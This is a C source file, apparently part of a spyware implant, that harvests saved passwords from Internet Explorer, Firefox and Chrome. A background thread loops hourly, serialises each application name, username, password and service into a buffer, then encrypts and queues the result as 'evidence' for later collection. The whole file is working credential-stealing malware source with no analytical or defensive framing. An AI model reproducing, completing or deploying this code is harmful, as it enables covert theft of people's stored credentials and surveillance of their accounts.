#include <Windows.h>

#include "globals.h"
#include "password.h"
#include "zmem.h"
#include "utils.h"
#include "proto.h"
#include "sha1.h"
#include "password.h"
#include "ie_password.h"
#include "ffox_password.h"
#include "chrome_password.h"
#include "conf.h"
#include "debug.h"

PASSWORD_LOGS lpPasswordLogs = { 0x0, 0x0 };

BOOL QueuePasswordLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	lpPasswordLogs.lpBuffer = lpEvBuff;
	lpPasswordLogs.dwSize = dwEvSize;

	return TRUE;
}


BOOL PasswordLogEntry(LPWSTR strAppName, LPWSTR strService, LPWSTR strUserName, LPWSTR strPassword, LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	DWORD dwDelimiter = ELEM_DELIMITER;
	DWORD dwLogSize = (wcslen(strAppName)+1)*sizeof(WCHAR) + 
		(wcslen(strService)+1)*sizeof(WCHAR) +
		(wcslen(strUserName)+1)*sizeof(WCHAR) +
		(wcslen(strPassword)+1)*sizeof(WCHAR) +
		sizeof(DWORD);
	
	DWORD dwTotalSize = dwLogSize;
	if (*lpBuffer)
		dwTotalSize = dwLogSize + *dwBuffSize;
	*lpBuffer = (LPBYTE) realloc(*lpBuffer, dwTotalSize);
	
	LPBYTE lpTmpBuff = *lpBuffer + *dwBuffSize;

	memcpy(lpTmpBuff, strAppName,  (wcslen(strAppName)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strAppName)+1)*sizeof(WCHAR);
	memcpy(lpTmpBuff, strUserName,  (wcslen(strUserName)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strUserName)+1)*sizeof(WCHAR);
	memcpy(lpTmpBuff, strPassword,  (wcslen(strPassword)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strPassword)+1)*sizeof(WCHAR);
	memcpy(lpTmpBuff, strService,  (wcslen(strService)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strService)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, &dwDelimiter, sizeof(DWORD));

	*dwBuffSize = dwTotalSize;

	return TRUE;
}

VOID GetHashStr(LPWSTR strPassword, LPSTR strHash)
{
	SHA1Context sha;
	SHA1Reset(&sha);
    SHA1Input(&sha, (PBYTE)strPassword, (DWORD)(wcslen(strPassword)+1)*2);

	strHash[0]='\0';	

	if (SHA1Result(&sha)) 
	{ 
        // Crea la stringa per la comparazione
		LPSTR ptr = (LPSTR)sha.Message_Digest;

        char TmpBuf[128];
        unsigned char tail=0;
		// Calcolo Tail
        for(int i=0; i<20; i++) 
		{
            unsigned char c = ptr[i];
            tail += c;
		}
		for(int i=0; i<5; i++) 
		{
            sprintf(TmpBuf, "%s%.8X", strHash, sha.Message_Digest[i]);  //FIXME: array
            strcpy_s(strHash, 1024, TmpBuf);
        }

        // Aggiunge gli ultimi 2 byte
        sprintf(TmpBuf, "%s%2.2X", strHash, tail);  //FIXME: array
        strcpy_s(strHash, 1024, TmpBuf);
	}
}

VOID DumpPassword()
{
	LPBYTE lpBuffer = NULL;
	DWORD dwBuffSize = 0;

	DumpIEPasswords(&lpBuffer, &dwBuffSize);
	DumpFFoxPasswords(&lpBuffer, &dwBuffSize);
	DumpChromePasswords(&lpBuffer, &dwBuffSize);

	DWORD dwEvSize;
	LPBYTE lpEvBuffer = PackEncryptEvidence(dwBuffSize, lpBuffer, PM_PSTOREAGENT, NULL, 0, &dwEvSize);
	zfree(lpBuffer);

	if (!QueuePasswordLog(lpEvBuffer, dwEvSize))
		zfree(lpEvBuffer);
}

VOID PasswordMain()
{
	CoInitialize(NULL);

	while (1)
	{
		if (bPasswordThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] PasswordMain exiting\n");
#endif
			hPasswordThread = NULL;
			return;
		}

		if (bCollectEvidences)
		{
			if (!lpPasswordLogs.dwSize && !lpPasswordLogs.lpBuffer)
				DumpPassword();
		}

		MySleep(1000*60*60); // 1 ora FIXME
		//MySleep(5);
		//MySleep(ConfGetRepeat(L"password"));
	}
}